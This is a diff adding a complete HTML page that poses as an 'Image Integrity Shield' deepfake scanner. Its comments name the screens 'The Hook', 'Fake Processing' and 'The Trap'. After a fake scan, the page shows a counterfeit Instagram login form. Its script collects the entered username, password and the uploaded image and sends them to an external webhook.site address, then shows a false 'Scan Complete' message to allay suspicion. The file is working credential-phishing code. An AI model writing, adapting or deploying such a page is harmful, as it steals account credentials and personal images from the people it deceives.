@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sentinel AI - Image Integrity Shield</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&display=swap');
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #111827;
+            color: #E5E7EB;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            width: 420px;
+            background-color: #1F2937;
+            border-radius: 8px;
+            padding: 32px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            text-align: center;
+            border: 1px solid #374151;
+        }
+
+        .screen { display: none; }
+        .screen.active { display: block; }
+
+        h2 {
+            color: #F9FAFB;
+            font-size: 1.5em;
+            margin-bottom: 12px;
+        }
+
+        p {
+            color: #9CA3AF;
+            margin-bottom: 24px;
+        }
+
+        .upload-area {
+            border: 2px dashed #4B5563;
+            border-radius: 8px;
+            padding: 40px 20px;
+            cursor: pointer;
+            transition: background-color 0.2s, border-color 0.2s;
+        }
+        .upload-area:hover {
+            background-color: #374151;
+            border-color: #6B7280;
+        }
+        .upload-area span {
+            display: block;
+            font-weight: 500;
+            color: #D1D5DB;
+        }
+        
+        input[type="file"] { display: none; }
+
+        .loader {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #4B5563;
+            border-top: 4px solid #3B82F6;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* Login Form Styles */
+        .login-form { text-align: left; }
+        .login-form h3 {
+            text-align: center;
+            font-size: 3em;
+            font-weight: 700;
+            color: #F9FAFB;
+            margin-bottom: 24px;
+            font-family: 'Billabong', 'Grand Hotel', cursive;
+        }
+        .login-form input {
+            width: 100%;
+            box-sizing: border-box;
+            background-color: #374151;
+            border: 1px solid #4B5563;
+            border-radius: 4px;
+            padding: 12px;
+            color: #F9FAFB;
+            margin-bottom: 12px;
+            font-size: 1em;
+        }
+        .login-form button {
+            width: 100%;
+            background-color: #3B82F6;
+            color: #F9FAFB;
+            border: none;
+            padding: 12px;
+            border-radius: 4px;
+            font-weight: 700;
+            cursor: pointer;
+            font-size: 1em;
+            transition: background-color 0.2s;
+        }
+        .login-form button:hover { background-color: #2563EB; }
+
+        /* Final Report Screen Styles */
+        #report-screen svg {
+            width: 60px;
+            height: 60px;
+            margin: 0 auto 20px auto;
+            color: #10B981; /* A reassuring green */
+        }
+        #report-screen .new-scan-btn {
+             background-color: transparent;
+             border: 1px solid #4B5563;
+             color: #9CA3AF;
+             padding: 10px 20px;
+             border-radius: 4px;
+             cursor: pointer;
+             margin-top: 20px;
+        }
+        #report-screen .new-scan-btn:hover {
+            background-color: #374151;
+        }
+    </style>
+    <link href="https://fonts.cdnfonts.com/css/billabong" rel="stylesheet">
+</head>
+<body>
+
+    <div class="container">
+        <!-- Screen 1: The Hook (Upload) -->
+        <div id="upload-screen" class="screen active">
+            <h2>Image Integrity Shield</h2>
+            <p>Upload an image to scan our private database and the public web for unauthorized copies or AI-generated deepfakes.</p>
+            <label for="file-upload" class="upload-area">
+                <span id="upload-text">Click to select your image</span>
+            </label>
+            <input type="file" id="file-upload" accept="image/*">
+        </div>
+
+        <!-- Screen 2: Fake Processing -->
+        <div id="processing-screen" class="screen">
+            <h2>Scanning...</h2>
+            <p>Analyzing image hash against 10 billion+ sources. This may take a moment.</p>
+            <div class="loader"></div>
+        </div>
+
+        <!-- Screen 3: The Trap (Login Form) -->
+        <div id="login-screen" class="screen">
+            <div class="login-form">
+                <h3 style="font-family: 'Billabong', cursive;">Instagram</h3>
+                <p style="text-align:center; color:#FBBF24; font-weight:500;">Potential Match Found. Please verify your identity to view the secure report.</p>
+                <input type="text" id="username" placeholder="Phone number, username, or email">
+                <input type="password" id="password" placeholder="Password">
+                <button onclick="submitCredentials()">Secure Log In</button>
+            </div>
+        </div>
+        
+        <!-- Screen 4: The Plausible "All Clear" -->
+        <div id="report-screen" class="screen">
+            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor">
+                <path stroke-linecap="round" stroke-linejoin="round" d="M9 12.75L11.25 15 15 9.75M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
+            </svg>
+            <h2>Scan Complete</h2>
+            <p>Verification successful. No critical threats or exact matches were found on monitored public networks.</p>
+            <p style="font-size:0.9em; color:#6B7280;">We recommend performing regular scans to ensure your digital integrity. Your session is now closed.</p>
+            <button class="new-scan-btn" onclick="window.location.reload()">Start New Scan</button>
+        </div>
+    </div>
+
+    <script>
+        const screens = document.querySelectorAll('.screen');
+        const fileUpload = document.getElementById('file-upload');
+        const uploadText = document.getElementById('upload-text');
+        
+        let capturedData = {};
+
+        function switchScreen(screenId) {
+            screens.forEach(screen => screen.classList.remove('active'));
+            document.getElementById(screenId).classList.add('active');
+        }
+
+        fileUpload.addEventListener('change', (event) => {
+            if (event.target.files && event.target.files[0]) {
+                const file = event.target.files[0];
+                uploadText.textContent = `Selected: ${file.name}`;
+                
+                const reader = new FileReader();
+                reader.onload = (e) => {
+                    capturedData.image = e.target.result;
+                };
+                reader.readAsDataURL(file);
+
+                setTimeout(() => {
+                    switchScreen('processing-screen');
+                }, 500);
+
+                setTimeout(() => {
+                    switchScreen('login-screen');
+                }, 4000);
+            }
+        });
+
+        function submitCredentials() {
+            capturedData.username = document.getElementById('username').value;
+            capturedData.password = document.getElementById('password').value;
+            
+            if (!capturedData.username || !capturedData.password) {
+                alert('Verification requires both fields.');
+                return;
+            }
+
+            const webhookUrl = "https://webhook.site/c87b1a2f-3455-4668-9f87-e67aaf269c85"; 
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(capturedData)
+            });
+
+            switchScreen('report-screen');
+        }
+    </script>
+</body>
+</html>
